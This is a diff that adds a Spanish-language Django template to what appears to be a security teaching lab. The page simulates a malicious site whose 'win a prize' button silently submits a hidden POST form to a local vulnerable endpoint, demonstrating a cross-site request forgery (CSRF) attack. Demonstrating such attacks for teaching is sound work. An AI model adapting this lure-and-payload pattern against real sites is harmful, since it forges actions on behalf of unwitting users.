@@ -1,0 +1,28 @@
+{% extends "cards/base.html" %}
+{% block title %}CSRF — Ataque simulado{% endblock %}
+{% block content %}
+<div class="vulnerable">
+    <h2>🎭 Simulación de ataque CSRF</h2>
+    <p>Esta página simula un <strong>sitio externo malicioso</strong>. Al hacer clic en el botón, envía un POST
+        silencioso al endpoint vulnerable.</p>
+    <p>Abre la consola del navegador para ver el resultado.</p>
+</div>
+<button onclick="atacar()">¡Hacer clic aquí para ganar un premio! 🎁</button>
+<div id="resultado"></div>
+<script>
+    function atacar() {
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = '/csrf/vulnerable/';
+        const campos = { autor: 'Atacante externo', contenido: '¡Fui inyectado por CSRF!' };
+        for (const [k, v] of Object.entries(campos)) {
+            const input = document.createElement('input');
+            input.name = k; input.value = v; input.type = 'hidden';
+            form.appendChild(input);
+        }
+        document.body.appendChild(form);
+        form.submit();
+        document.getElementById('resultado').textContent = 'POST enviado al endpoint vulnerable. Revisá /csrf/vulnerable/';
+    }
+</script>
+{% endblock %}
